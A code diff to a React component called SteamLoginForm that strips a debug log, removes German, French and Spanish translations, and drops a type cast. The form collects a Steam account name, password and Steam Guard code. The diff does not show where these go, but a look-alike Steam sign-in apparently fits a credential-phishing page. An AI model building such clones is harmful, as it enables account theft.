@@ -23,7 +23,6 @@ const SteamLoginForm = () => {
   useEffect(() => {
     try {
       const userLanguage = navigator.language.split('-')[0];
-      console.log("Detected user language:", userLanguage);
       if (['en', 'tr', 'de', 'fr', 'es'].includes(userLanguage)) {
         setLanguage(userLanguage);
       }
@@ -57,46 +56,11 @@ const SteamLoginForm = () => {
       steamGuardDesc: 'Enter the Steam Guard code sent to your email',
       submitButton: 'Submit'
     },
-    de: {
-      title: 'BEI IHREM KONTO ANMELDEN',
-      accountLabel: 'STEAM-KONTONAME',
-      passwordLabel: 'PASSWORT',
-      rememberMe: 'Angemeldet bleiben',
-      loginButton: 'Anmelden',
-      loading: 'Anmeldung...',
-      helpText: 'Hilfe, ich kann mich nicht anmelden',
-      steamGuardTitle: 'Steam Guard Verifizierung',
-      steamGuardDesc: 'Geben Sie den an Ihre E-Mail gesendeten Steam Guard-Code ein',
-      submitButton: 'Absenden'
-    },
-    fr: {
-      title: 'CONNECTEZ-VOUS À VOTRE COMPTE',
-      accountLabel: 'NOM DU COMPTE STEAM',
-      passwordLabel: 'MOT DE PASSE',
-      rememberMe: 'Se souvenir de moi',
-      loginButton: 'Se connecter',
-      loading: 'Connexion en cours...',
-      helpText: 'Aide, je ne peux pas me connecter',
-      steamGuardTitle: 'Vérification Steam Guard',
-      steamGuardDesc: 'Entrez le code Steam Guard envoyé à votre e-mail',
-      submitButton: 'Soumettre'
-    },
-    es: {
-      title: 'INICIAR SESIÓN EN SU CUENTA',
-      accountLabel: 'NOMBRE DE CUENTA STEAM',
-      passwordLabel: 'CONTRASEÑA',
-      rememberMe: 'Recordarme',
-      loginButton: 'Iniciar sesión',
-      loading: 'Iniciando sesión...',
-      helpText: 'Ayuda, no puedo iniciar sesión',
-      steamGuardTitle: 'Verificación de Steam Guard',
-      steamGuardDesc: 'Introduzca el código de Steam Guard enviado a su correo electrónico',
-      submitButton: 'Enviar'
-    }
+    // Add more languages as needed
   };
 
   // Get translations based on current language
-  const t = translations[language as keyof typeof translations] || translations.en;
+  const t = translations[language] || translations.en;
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
